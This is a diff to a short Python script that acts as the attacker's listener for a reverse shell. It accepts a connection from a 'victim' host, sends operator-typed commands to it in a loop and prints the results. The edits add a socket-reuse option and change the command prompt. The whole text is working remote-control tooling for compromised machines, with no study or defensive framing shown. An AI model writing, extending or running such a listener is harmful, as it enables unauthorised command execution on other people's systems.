@@ -4,6 +4,7 @@ import sys
 ip = sys.argv[1]
 port = sys.argv[2]
 attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+attacker.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 4096)
 attacker.bind((ip, int(port)))
 attacker.listen(1)
 print(f'Listening on {ip}:{port}')
@@ -11,7 +12,7 @@ victim, victim_ip = attacker.accept()
 print(f'Connection from {victim_ip}')
 try:
     while True:
-        cmd = input("$ ")
+        cmd = input("PRS #> ")
         victim.send(cmd.encode())#Command sent..
         op = victim.recv(4096)
         print(op.decode())
